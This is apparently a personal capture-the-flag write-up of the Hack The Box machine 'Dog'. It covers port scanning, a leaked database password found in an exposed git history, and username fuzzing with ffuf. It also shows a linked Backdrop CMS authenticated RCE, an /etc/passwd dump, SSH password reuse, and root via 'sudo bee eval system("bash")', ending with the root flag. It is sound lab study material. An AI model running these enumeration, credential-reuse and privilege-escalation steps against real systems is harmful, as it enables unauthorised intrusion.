` sudo nmap -vvv -sC --reason -T4 -sCV -p0-65535 10.129.23.103 `

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   10.129.23.103:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


`http://10.129.23.103/.git/logs/refs/heads/master`
`0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000	commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases`

Dog@dog.htb appears to exist


`http://10.129.23.103/?q=admin`
Brings us to the admin page. Interested in the ?q= is this parameter vulnerable to anything? 


Website show Powered By Backdrop CMS\-- google search does show some vulns exploit db has https://www.exploit-db.com/exploits/52021 This is authenticated RCE so we need to get a password from somewhere


in the githistory `$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';`

using ffuf we are able to enumerate `http://10.129.23.103/?q=accounts` 

```
 ffuf -u "http://10.129.23.103/?q=accounts/FUZZ" -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.23.103/?q=accounts/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

john                    [Status: 403, Size: 7622, Words: 643, Lines: 114, Duration: 344ms]
tiffany                 [Status: 403, Size: 7622, Words: 643, Lines: 114, Duration: 620ms]
John                    [Status: 403, Size: 7622, Words: 643, Lines: 114, Duration: 10ms]
morris                  [Status: 403, Size: 7622, Words: 643, Lines: 114, Duration: 1662ms]
```
Tiffany with the password works. Now we will be able to perform the authenticated RCE exploit

https://www.exploit-db.com/exploits/52021

Using https://github.com/rvizx/backdrop-rce/blob/main/README.md I was able to get a shell as www-data on the box 

/etc/passwd had some goodies 
```
kali@10.129.23.103 > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash had re-used the DB password for SSH logins

```
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Usage: bee  global-options command options arguments

 eval                 
   ev, php-eval                                                                                                                                               
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop



We have to discover that backdrop can only run from a root directory which happens to be /var/www/html 

```
johncusack@dog:/var/www/html$ sudo bee eval 'system("id")'
uid=0(root) gid=0(root) groups=0(root)
johncusack@dog:/var/www/html$ sudo bee eval 'system("bash")'
root@dog:/var/www/html# whoami
root
root@dog:/var/www/html# cd /root
root@dog:~# ls
root.txt
root@dog:~# cat root.txt 
8ac7e4ebaa38972c8902bee6bf00a556
```

This box consisted of enumerating through a git repo history to find a password it the required to make use of an authenticated RCE exploit. I found the password by luck and had to rely on guided mode to instruct me where the password could be reused once I found a roadblock on the www-data shell. The password was reused by the johncusack user. I also found the password by luck. 

0xdf Found the password by seeing there was a settings.php file. I just grepped for database and luckily found the password out of the 5k lines. He also grepped for @dog.htb to find the tiffany user. I used FFUF.  After getting this instruction from guided mode I was able to ssh into the john user and was veeerry close to getting the priv esc. I knew it had something to do with bee. But I was unable to understand how to run the commands. Guided mode said it needed to be done in a root directory I also tried to use the command that would run a script rather than just the eval command which would run php code which I could have just made it spawn a shell since it was running as root. 0xdf went to /var/www/html because thats where web applications are

`sudo bee eval 'system("bash")'` is this boxes priv esc command 